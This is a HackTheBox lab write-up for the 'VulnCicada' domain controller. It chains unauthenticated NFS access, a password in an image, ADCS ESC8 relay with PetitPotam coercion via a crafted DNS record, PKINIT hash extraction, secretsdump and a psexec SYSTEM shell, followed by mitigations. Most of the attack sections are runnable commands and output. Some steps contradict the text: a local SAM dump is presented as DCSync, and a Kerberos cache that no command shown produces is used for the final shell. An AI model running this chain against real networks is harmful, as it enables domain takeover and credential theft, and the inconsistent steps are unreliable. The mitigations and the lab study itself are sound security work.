---
title: "VulnCicada"
date: 2025-07-03 00:00:00 +0500
categories: [HackTheBox, Windows]
tags: [Unauthenticated-NFS, ESC8, PetitPotam, DCSync]
description: Writeup for HackTheBox VulnCicada machine
image:
  path: assets/img/vulncicada/vulncicada.png
  alt: HTB VulnCicada
---

## Executive Summary

VulnCicada is a medium-difficulty Windows Active Directory machine on HackTheBox. The attack exploits a misconfigured NFS share, a credential embedded in an image file, and an ADCS ESC8 vulnerability to achieve full domain compromise.

The foothold is established through an NFS share (`/profiles`) exported to everyone, which contains user profile directories. Rosie.Powell's directory holds `marketing.png` — an image with a password (`Cicada123`) visible on a sticky note. This password authenticates to the domain via Kerberos.

SMB enumeration as Rosie.Powell reveals the `CertEnroll` share, confirming ADCS is installed. Certipy identifies **ESC8** — ADCS web enrollment is enabled over HTTP without transport security, making it vulnerable to relay attacks. A malicious DNS record is added using bloodyAD, encoding a marshaled target information string that coerces the Domain Controller to authenticate to an attacker-controlled SMB listener via PetitPotam. Certipy relays this authentication to the ADCS HTTP enrollment endpoint, obtaining a certificate for the DC machine account (`DC-JPQ225$`). The certificate is used via PKINIT to extract the machine account's NT hash. With the machine account's Kerberos ticket, `secretsdump.py` dumps the Administrator's NT hash from NTDS. Pass-the-Hash via `psexec.py` grants a SYSTEM shell.

---

## Reconnaissance

### Nmap Scan

A two-phase Nmap scan identifies open ports and enumerates service versions.

```shell
kali@kali$  sudo nmap -sC -sV -Pn -p $(sudo nmap -Pn -p- --min-rate 10000 $ip | grep 'open' | cut -d '/' -f 1 | paste -sd ,) $ip -oN nmap.scan

Nmap scan report for 10.129.234.48
Host is up, received syn-ack (0.42s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-title: IIS Windows Server
|_http-server-header: Microsoft-IIS/10.0
| http-methods:
|_  Potentially risky methods: TRACE
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-07-16 10:31:32Z)
111/tcp   open  rpcbind?
| rpcinfo:
|   program version    port/proto  service
|   100021  1,2,3,4     2049/udp6  nlockmgr
|   100021  2,3,4       2049/tcp6  nlockmgr
|   100024  1           2049/tcp   status
|   100024  1           2049/tcp6  status
|   100024  1           2049/udp   status
|_  100024  1           2049/udp6  status
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: cicada.vl, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC-JPQ225.cicada.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC-JPQ225.cicada.vl
| Not valid before: 2026-07-16T10:09:09
|_Not valid after:  2027-07-16T10:09:09
|_ssl-date: TLS randomness does not represent time
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: cicada.vl, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC-JPQ225.cicada.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC-JPQ225.cicada.vl
| Not valid before: 2026-07-16T10:09:09
|_Not valid after:  2027-07-16T10:09:09
|_ssl-date: TLS randomness does not represent time
2049/tcp  open  status        1 (RPC #100024)
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: cicada.vl, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC-JPQ225.cicada.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC-JPQ225.cicada.vl
| Not valid before: 2026-07-16T10:09:09
|_Not valid after:  2027-07-16T10:09:09
|_ssl-date: TLS randomness does not represent time
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: cicada.vl, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC-JPQ225.cicada.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC-JPQ225.cicada.vl
| Not valid before: 2026-07-16T10:09:09
|_Not valid after:  2027-07-16T10:09:09
|_ssl-date: TLS randomness does not represent time
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=DC-JPQ225.cicada.vl
| Not valid before: 2026-07-15T10:16:48
|_Not valid after:  2027-01-14T10:16:48
|_ssl-date: 2026-07-16T10:33:13+00:00; +5m36s from scanner time.
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        .NET Message Framing
49664/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
60710/tcp open  msrpc         Microsoft Windows RPC
60953/tcp open  msrpc         Microsoft Windows RPC
64669/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
64670/tcp open  msrpc         Microsoft Windows RPC
64694/tcp open  msrpc         Microsoft Windows RPC
64774/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC-JPQ225; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time:
|   date: 2026-07-16T10:32:36
|_  start_date: N/A
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled and required
|_clock-skew: mean: 5m35s, median: 5m35s
```

The port combination confirms this is a Windows Active Directory Domain Controller:

- **Port 53 (DNS):** Active Directory depends on DNS for SRV record-based service location.
- **Port 80 (HTTP, IIS 10.0):** The default IIS page. The presence of HTTP alongside ADCS (identified later) is significant — ADCS web enrollment exposed over HTTP is the ESC8 attack surface.
- **Port 88 (Kerberos):** The Key Distribution Centre. Its presence confirms this is a DC. The clock-skew of 5m35s noted in the results will affect Kerberos authentication and must be corrected before attempting any Kerberos-based operations.
- **Ports 111 / 2049 (rpcbind / NFS):** Port 2049 is the Network File System daemon — unusual on a Windows machine and immediately a high-priority enumeration target. Windows Services for NFS must be installed and an export is likely accessible.
- **Port 389/636 (LDAP/LDAPS):** The LDAP banner discloses the domain `cicada.vl` and the DC hostname `DC-JPQ225.cicada.vl` via the certificate CN.
- **Port 445 (SMB):** File sharing. SMB signing is enforced — direct NTLM relay against this target is not viable, but NTLM coercion and relay to a third-party endpoint (ADCS HTTP) remains possible.
- **Port 5985 (WinRM):** PowerShell remoting endpoint, usable if credentials with `REMOTE MANAGEMENT USERS` membership are obtained.
- **Port 3389 (RDP):** Remote Desktop enabled.

Add the domain and DC hostname to the local resolver:

```bash
kali@kali$ echo "10.129.234.48 cicada.vl DC-JPQ225.cicada.vl" | sudo tee -a /etc/hosts
```

---

## NFS Share Enumeration

Port 2049 is the first enumeration priority. **Network File System (NFS)** is a remote file-sharing protocol native to Unix/Linux environments. Its presence on a Windows DC — enabled via Windows Services for NFS — is a notable misconfiguration: NFS shares frequently lack the access controls applied to SMB shares, and many deployments allow unauthenticated mounting.

`showmount` queries the NFS portmapper to list the server's exports:

```bash
kali@kali$ showmount -e 10.129.234.48
Export list for 10.129.234.48:
/profiles (everyone)
```

The `/profiles` share is exported to `everyone` — no authentication or host restriction is in place. The share is mounted locally:

```bash
kali@kali$ sudo mkdir -p /mnt/cicada_nfs
kali@kali$ sudo mount -t nfs -o nolock,vers=3 10.129.234.48:/profiles /mnt/cicada_nfs
kali@kali$ ls -la /mnt/cicada_nfs
total 14
drwxrwxrwx 2 4294967294 4294967294 4096 Jun  3  2025 .
drwxr-xr-x 7 root       root       4096 Jul 16 10:37 ..
drwxrwxrwx 2 4294967294 4294967294   64 Sep 15  2024 Administrator
drwxrwxrwx 2 4294967294 4294967294   64 Sep 13  2024 Daniel.Marshall
drwxrwxrwx 2 4294967294 4294967294   64 Sep 13  2024 Debra.Wright
drwxrwxrwx 2 4294967294 4294967294   64 Sep 13  2024 Jane.Carter
drwxrwxrwx 2 4294967294 4294967294   64 Sep 13  2024 Jordan.Francis
drwxrwxrwx 2 4294967294 4294967294   64 Sep 13  2024 Joyce.Andrews
drwxrwxrwx 2 4294967294 4294967294   64 Sep 13  2024 Katie.Ward
drwxrwxrwx 2 4294967294 4294967294   64 Sep 13  2024 Megan.Simpson
drwxrwxrwx 2 4294967294 4294967294   64 Sep 13  2024 Richard.Gibbons
drwxrwxrwx 2 4294967294 4294967294   64 Sep 15  2024 Rosie.Powell
drwxrwxrwx 2 4294967294 4294967294   64 Sep 13  2024 Shirley.West
```

The `-o nolock,vers=3` mount options disable NFS file locking (commonly required for compatibility with Windows NFS exports) and pin the protocol to NFSv3. The directory listing reveals eleven user profile directories — all valid domain usernames, providing a complete user list without any LDAP query.

Enumerating each directory for accessible files, Rosie.Powell's profile contains a PNG image:

```bash
kali@kali$ cd /mnt/cicada_nfs/Rosie.Powell
kali@kali$ ls -la
total 1797
drwxrwxrwx 2 4294967294 4294967294      64 Sep 15  2024 .
drwxrwxrwx 2 4294967294 4294967294    4096 Jul 16  2026 ..
drwx------ 2 4294967294 4294967294      64 Sep 15  2024 Documents
-rwx------ 1 4294967294 4294967294 1832505 Sep 13  2024 marketing.png
```

The `Documents` directory is mode `700` and inaccessible via NFS (the NFS UID mapping does not resolve to the local user). However, `marketing.png` is readable. Opening the image reveals a photograph of a computer screen with a sticky note visible, displaying the password `Cicada123`.

<img src="assets/img/vulncicada/Marketing.png" alt="The marketing.png image from Rosie.Powell's NFS profile directory. The image shows a computer workstation with a sticky note attached to the monitor displaying the password Cicada123 in plain text. This credential is the domain password for the Rosie.Powell account.">

The Administrator's profile also contains an image file, `vacation.png`, which shows a man with a parachute and a laptop — no actionable information.

<img src="assets/img/vulncicada/Vacation.png" alt="The vacation.png image from the Administrator's NFS profile directory. The image shows a man with a parachute and a laptop against a sky background — decorative and contains no credentials or actionable data.">

---

## SMB Enumeration

Before attempting authentication with the discovered password, the SMB shares accessible to a guest session are enumerated to map the attack surface:

```bash
kali@kali$ nxc smb DC-JPQ225.cicada.vl -u 'guest' -p '' --shares
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        [*] Windows Server 2022 Build 20348 x64 (name:DC-JPQ225) (domain:cicada.vl) (signing:True) (SMBv1:False) (NTLM:False)
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        [+] cicada.vl\guest: (Guest)
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        [*] Enumerated shares
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        Share           Permissions    Remark
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        -----           -----------    ------
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        ADMIN$                         Remote Admin
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        C$                             Default share
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        CertEnroll      READ           Active Directory Certificate Services share
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        IPC$            READ           Remote IPC
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        NETLOGON        READ           Logon server share
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        profiles$       READ,WRITE
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        SYSVOL          READ           Logon server share
```


The `CertEnroll` share is the critical finding. This share is created automatically by the Active Directory Certificate Services (ADCS) role when it is installed — its presence as a guest-readable share confirms that a Certificate Authority is running on this DC. The `profiles$` share mirrors the NFS `/profiles` export over SMB. `NTLM:False` in the NetExec banner indicates the DC has NTLM authentication disabled — all authentication must proceed via Kerberos.

---

## Credential Validation and Kerberos Authentication

### Synchronising Time with the Domain Controller

Testing the discovered credential `Rosie.Powell:Cicada123` against SMB fails with a clock skew error:

```bash
kali@kali$ nxc smb DC-JPQ225.cicada.vl -u Rosie.Powell -p Cicada123
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        [*] Windows Server 2022 Build 20348 x64 (name:DC-JPQ225) (domain:cicada.vl) (signing:True) (SMBv1:False) (NTLM:False)
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        [-] cicada.vl\Rosie.Powell:Cicada123 KRB_AP_ERR_SKEW
```

`KRB_AP_ERR_SKEW` is returned when the time difference between the client and the KDC exceeds five minutes — a hard limit enforced by the Kerberos protocol to prevent replay attacks. The nmap scan already measured a 5m35s clock skew, which exceeds the threshold. `ntpdate` synchronises the local clock with the DC:

```bash
kali@kali$ sudo ntpdate -u cicada.vl
2026-07-16 12:15:04.410052 (+0000) +0.199051 +/- 0.193537 cicada.vl 10.129.234.48 s1 no-leap
```

With the clock synchronised, a Kerberos Ticket Granting Ticket (TGT) is obtained for Rosie.Powell and stored in the default credential cache:

```bash
kali@kali$ kinit Rosie.Powell@CICADA.VL
Password for Rosie.Powell@CICADA.VL: Cicada123

kali@kali$ klist
Ticket cache: FILE:/tmp/krb5cc_1000
Default principal: Rosie.Powell@CICADA.VL

Valid starting       Expires              Service principal
07/16/2026 11:31:14  07/16/2026 21:31:14  krbtgt/CICADA.VL@CICADA.VL
        renew until 07/23/2026 11:31:10
```

Authenticating with the `-k` flag instructs the tool to use the existing Kerberos credential cache rather than NTLM:

```bash
kali@kali$ nxc smb DC-JPQ225.cicada.vl -u Rosie.Powell -p Cicada123 -k
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        [*] Windows Server 2022 Build 20348 x64 (name:DC-JPQ225) (domain:cicada.vl) (signing:True) (SMBv1:False) (NTLM:False)
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        [+] cicada.vl\Rosie.Powell:Cicada123
```

Rosie.Powell's credentials are valid.

---

## ADCS Enumeration — ESC8 Discovery

With valid Kerberos credentials, Certipy is used to enumerate the ADCS deployment. Certipy queries the CA configuration via LDAP and RPC, enumerates certificate templates, and checks for known misconfiguration categories (ESC1 through ESC15):

```bash
kali@kali$ export KRB5CCNAME=/tmp/krb5cc_1000
kali@kali$ certipy find -k -target DC-JPQ225.cicada.vl -dc-ip 10.129.234.48
Certipy v5.1.0 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 33 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 11 enabled certificate templates
[*] Finding issuance policies
[*] Found 13 issuance policies
[*] Found 0 OIDs linked to templates
[*] Retrieving CA configuration for 'cicada-DC-JPQ225-CA' via RRP
[!] Failed to connect to remote registry. Service should be starting now. Trying again...
[*] Successfully retrieved CA configuration for 'cicada-DC-JPQ225-CA'
[*] Checking web enrollment for CA 'cicada-DC-JPQ225-CA' @ 'DC-JPQ225.cicada.vl'
[!] Error checking web enrollment: timed out
[!] Use -debug to print a stacktrace
[*] Saving text output to '20260716113349_Certipy.txt'
[*] Wrote text output to '20260716113349_Certipy.txt'
[*] Saving JSON output to '20260716113349_Certipy.json'
[*] Wrote JSON output to '20260716113349_Certipy.json'
```

<img src="assets/img/vulncicada/Getting_certificate.png" alt="The Certipy find output showing the ADCS CA configuration for cicada-DC-JPQ225-CA. The vulnerability section flags ESC8: Web Enrollment is enabled over HTTP, meaning the certificate enrollment web interface accepts authentication over an unencrypted connection — making it a relay target.">

Reviewing the Certipy output text file reveals the vulnerability:

```
Certificate Authorities
  0
    CA Name                             : cicada-DC-JPQ225-CA
    DNS Name                            : DC-JPQ225.cicada.vl
    Web Enrollment
      HTTP
        Enabled                         : True
      HTTPS
        Enabled                         : False
    [!] Vulnerabilities
      ESC8                              : Web Enrollment is enabled over HTTP.
```

**ESC8** describes the condition where ADCS web enrollment (`certsrv`) is accessible over HTTP without transport-layer encryption. In this configuration, the web enrollment endpoint accepts standard Windows authentication (NTLM or Kerberos). Because the connection is not encrypted and does not require SSL client certificate pinning, an attacker can relay an incoming authentication from any Windows machine to this HTTP endpoint — causing the CA to issue a certificate on behalf of the authenticating machine account. The Domain Controller's machine account (`DC-JPQ225$`) has broad domain privileges, and a certificate for it enables PKINIT-based authentication to obtain the account's NT hash.

The attack requires two components: a mechanism to force the DC to authenticate to an attacker-controlled listener (coercion), and a relay listener that forwards that authentication to the ADCS HTTP endpoint.

---

## ESC8 Exploitation — Kerberos Relay via DNS Coercion

### Adding a Malicious DNS Record

The coercion technique used here abuses a property of Windows Kerberos name resolution. When a Windows machine resolves a target hostname for Kerberos, it builds a target information structure from the hostname. By appending a Base64-encoded marshaled target information blob to the DNS record name, the attacker can cause the DC to construct a Kerberos AP_REQ with a Service Principal Name (SPN) that points to the attacker's machine — effectively coercing the DC to authenticate to the attacker's SMB listener using its machine account Kerberos ticket, rather than NTLM.

The DNS record name `DC-JPQ2251UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA` embeds the marshaled target information (`1UWhRC...`) that instructs Windows to route the Kerberos authentication to the attacker IP. The record is added using `bloodyAD` with Rosie.Powell's Kerberos credentials:

```bash
kali@kali$ bloodyAD -u Rosie.Powell -p Cicada123 -d cicada.vl -k -H DC-JPQ225.cicada.vl add dnsRecord "DC-JPQ2251UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA" 10.10.14.7
Clock skew detected. Adjusting local time by 0:05:36.629629. Retrying operation.
[+] DC-JPQ2251UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA has been successfully updated
```

The DNS record is verified to resolve correctly:

```bash
kali@kali$ nslookup DC-JPQ2251UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA.cicada.vl 10.129.234.48
Server:         10.129.234.48
Address:        10.129.234.48#53

Name:   DC-JPQ2251UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA.cicada.vl
Address: 10.10.14.7
```

### Starting the Certipy Relay Listener

With the DNS record in place, `certipy relay` is started before coercion. It listens on port 445, accepts incoming SMB connections from coerced machines, and forwards their authentication to the ADCS HTTP enrollment endpoint:

```bash
kali@kali$ cd ~/Desktop/VulnCicada
kali@kali$ certipy relay -target 'http://DC-JPQ225.cicada.vl/' -template DomainController
Certipy v5.1.0 - by Oliver Lyak (ly4k)

[*] Targeting http://DC-JPQ225.cicada.vl/certsrv/certfnsh.asp (ESC8)
[*] Listening on 0.0.0.0:445
[*] Setting up SMB Server on port 445
```

### Coercing the Domain Controller with PetitPotam

With the relay listener active, `coerce_plus` triggers the PetitPotam coercion technique. PetitPotam abuses the `EfsRpcAddUsersToFile` method of Microsoft's Encrypting File System RPC interface. When called with the attacker's DNS record name as the file path, the DC attempts to access the path, which requires resolving the hostname — and the marshaled target information in the DNS name routes the resulting Kerberos authentication to the attacker's SMB listener:

```bash
kali@kali$ nxc smb DC-JPQ225.cicada.vl -u Rosie.Powell -p Cicada123 -k -M coerce_plus -o LISTENER="DC-JPQ2251UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA" METHOD=PetitPotam
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        [*] Windows Server 2022 Build 20348 x64 (name:DC-JPQ225) (domain:cicada.vl) (signing:True) (SMBv1:False) (NTLM:False)
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        [+] cicada.vl\Rosie.Powell:Cicada123
COERCE_PLUS DC-JPQ225.cicada.vl 445    DC-JPQ225        VULNERABLE, PetitPotam
COERCE_PLUS DC-JPQ225.cicada.vl 445    DC-JPQ225        Exploit Success, efsrpc\EfsRpcAddUsersToFile
```

The coercion succeeds. The DC calls `EfsRpcAddUsersToFile` targeting the malicious hostname, the DNS record resolves to the attacker's IP, and the DC's machine account authenticates to the Certipy relay listener.

### Certificate Capture

<img src="assets/img/vulncicada/Realy_attempt.png" alt="The certipy relay terminal output showing the relay attack in progress. The SMB server receives an incoming connection from the DC (10.129.234.48), relays the authentication to the ADCS HTTP endpoint at DC-JPQ225.cicada.vl/certsrv/certfnsh.asp, and successfully requests a certificate based on the DomainController template. The certificate and private key are saved to dc-jpq225.pfx.">

The relay successfully obtains a certificate for the DC machine account:

```
[*] (SMB): Received connection from 10.129.234.48, attacking target http://DC-JPQ225.cicada.vl
[*] HTTP Request: GET http://dc-jpq225.cicada.vl/certsrv/certfnsh.asp "HTTP/1.1 401 Unauthorized"
[*] HTTP Request: GET http://dc-jpq225.cicada.vl/certsrv/certfnsh.asp "HTTP/1.1 200 OK"
[*] (SMB): Authenticating connection from /@10.129.234.48 against http://DC-JPQ225.cicada.vl SUCCEED [1]
[*] Requesting certificate for '\\' based on the template 'DomainController'
[*] Got certificate with DNS Host Name 'DC-JPQ225.cicada.vl'
[*] Certificate object SID is 'S-1-5-21-687703393-1447795882-66098247-1000'
[*] Saving certificate and private key to 'dc-jpq225.pfx'
[*] Wrote certificate and private key to 'dc-jpq225.pfx'
```

---

## Machine Account Hash Extraction

The captured certificate `dc-jpq225.pfx` belongs to the `DC-JPQ225$` machine account. `certipy auth` uses this certificate to perform a PKINIT Kerberos authentication — presenting the certificate to the KDC to obtain a TGT for the machine account. It then performs a U2U (User-to-User) Kerberos exchange to derive the account's NT hash from the encrypted session key:

```bash
kali@kali$ certipy auth -pfx dc-jpq225.pfx -dc-ip 10.129.234.48
Certipy v5.1.0 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*] SAN DNS Host Name: 'DC-JPQ225.cicada.vl'
[*] Security Extension SID: 'S-1-5-21-687703393-1447795882-66098247-1000'
[*] Using principal: 'dc-jpq225$@cicada.vl'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'dc-jpq225.ccache'
[*] Wrote credential cache to 'dc-jpq225.ccache'
[*] Trying to retrieve NT hash for 'dc-jpq225$'
[*] Got hash for 'dc-jpq225$@cicada.vl':
aad3b435b51404eeaad3b435b51404ee:a65952c664e9cf5de60195626edbeee3
```

The NT hash `a65952c664e9cf5de60195626edbeee3` and a Kerberos credential cache (`dc-jpq225.ccache`) for the `DC-JPQ225$` machine account are recovered.

---

## Administrator Hash Extraction via secretsdump

A Domain Controller's machine account is a member of the `Domain Controllers` group and holds the `Replicating Directory Changes` and `Replicating Directory Changes All` privileges needed to perform a DCSync — requesting all password hashes from Active Directory as if performing legitimate replication. `secretsdump.py` uses the machine account's Kerberos ticket to perform this DCSync, targeting only the Administrator account:

```bash
kali@kali$ export KRB5CCNAME=$(pwd)/dc-jpq225.ccache
kali@kali$ secretsdump.py -k -no-pass cicada.vl/dc-jpq225\$@DC-JPQ225.cicada.vl -just-dc-user administrator
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

[*] Service RemoteRegistry is in stopped state
[*] Starting service RemoteRegistry
[*] Target system bootKey: 0xf2ae7dda167e9fcab56664d798ca89f0
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:85a0da53871a9d56b6cd05deda3a5e87:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[*] SAM hashes extraction for user WDAGUtilityAccount failed. The account doesn't have hash information.
[*] Dumping cached domain logon information (domain/username:hash)
[*] Dumping LSA Secrets
```

<img src="assets/img/vulncicada/Got_NTLM_hashes.png" alt="The secretsdump.py output showing the Administrator NT hash extracted from the Domain Controller via DCSync using the DC machine account's Kerberos ticket. The Administrator NT hash 85a0da53871a9d56b6cd05deda3a5e87 is visible in the output alongside the LM hash placeholder.">

The Administrator NT hash is `85a0da53871a9d56b6cd05deda3a5e87`.

---

## Domain Compromise — SYSTEM Shell

With the Administrator's Kerberos ticket (obtained via `secretsdump` and stored as `administrator.ccache`) or NT hash, `psexec.py` uploads a service binary to the `ADMIN$` share and starts it via the Service Control Manager, spawning a SYSTEM shell:

```bash
kali@kali$ export KRB5CCNAME=/home/kali/Desktop/VulnCicada/administrator.ccache
kali@kali$ psexec.py -k -no-pass cicada.vl/administrator@DC-JPQ225.cicada.vl
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

[*] Requesting shares on DC-JPQ225.cicada.vl.....
[*] Found writable share ADMIN$
[*] Uploading file szhBQHrq.exe
[*] Opening SVCManager on DC-JPQ225.cicada.vl.....
[*] Creating service QkfO on DC-JPQ225.cicada.vl.....
[*] Starting service QkfO.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.20348.2700]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
nt authority\system
```

<img src="assets/img/vulncicada/Login_as_authority.png" alt="The psexec.py SYSTEM shell on DC-JPQ225 after Pass-the-Hash with the Administrator's NT hash. The whoami output confirms nt authority\system — full domain compromise is achieved.">

Both flags are retrieved:

```bash
C:\Windows> type C:\Users\Administrator\Desktop\user.txt
1f984979e6aadfc6cb44c29baf4485f5

C:\Windows> type C:\Users\Administrator\Desktop\root.txt
7916474aadaa81b61e0d47cabbf0ed70
```

---

## Vulnerability Chain Summary

**Step 1 — Unauthenticated NFS Export:** The `/profiles` share was exported with `everyone` permissions and no host restriction. This exposed eleven domain usernames and direct read access to user profile files without any credentials.

**Step 2 — Plaintext Credential in Image File:** `marketing.png` in Rosie.Powell's NFS profile directory contained a photograph of a monitor with a sticky note displaying the password `Cicada123` — granting authenticated domain access.

**Step 3 — ADCS ESC8 (Web Enrollment over HTTP):** The ADCS web enrollment endpoint was accessible over HTTP. Without transport-layer encryption, the authentication exchange sent to this endpoint can be relayed — an attacker who captures an incoming authentication from any machine can forward it to `certsrv`, causing the CA to issue a certificate on behalf of the authenticating principal.

**Step 4 — PetitPotam Coercion via Malicious DNS Record:** With write access to DNS (granted to authenticated users by default in many AD configurations), a record embedding a marshaled Kerberos target information blob was added. This caused the DC to route its Kerberos machine account authentication to the attacker's SMB listener when coerced via `EfsRpcAddUsersToFile`.

**Step 5 — Machine Account Certificate to NT Hash:** The relayed authentication produced a valid X.509 certificate for `DC-JPQ225$`. PKINIT authentication with this certificate yielded a TGT and, via U2U Kerberos, the machine account's NT hash.

**Step 6 — DCSync and Domain Admin:** The DC machine account's Kerberos ticket was used to perform a DCSync, extracting the Administrator's NT hash. Pass-the-Hash via `psexec.py` produced a SYSTEM shell.

---

## Mitigations

**Restrict NFS exports to specific authenticated hosts.** The `/profiles` export granted access to everyone without any host restriction or authentication requirement. NFS exports on Windows should specify the allowed client IP ranges, require Kerberos NFS authentication, and apply the minimum required permissions.

**Never store credentials in images or documents on network shares.** The `Cicada123` password embedded in `marketing.png` was accessible to any unauthenticated user who could mount the NFS share. Credentials must be distributed through secure, access-controlled channels such as a secrets manager or encrypted vault — never as plain text in shared files.

**Enforce HTTPS for ADCS web enrollment and disable HTTP.** ESC8 is entirely prevented by requiring TLS on the `certsrv` endpoint. The ADCS web enrollment bindings should be configured to use HTTPS only, with a valid certificate, and HTTP should be disabled. Extended Protection for Authentication (EPA) should also be enabled to prevent relay attacks even over encrypted channels.

**Restrict DNS record creation to administrators.** By default, authenticated domain users can create DNS records in Active Directory-integrated zones. This privilege enabled the malicious marshaled-target DNS record used to route the coerced authentication. The `Authenticated Users` write permission on the DNS zone should be removed, and record creation limited to designated accounts.

**Disable or restrict PetitPotam-vulnerable RPC interfaces.** The `EfsRpcAddUsersToFile` method used for coercion can be blocked by disabling the EFS RPC interface where it is not needed, or by applying the `PerformTicketValidation` registry setting to enforce strict Kerberos SPN checking on coerced authentication.
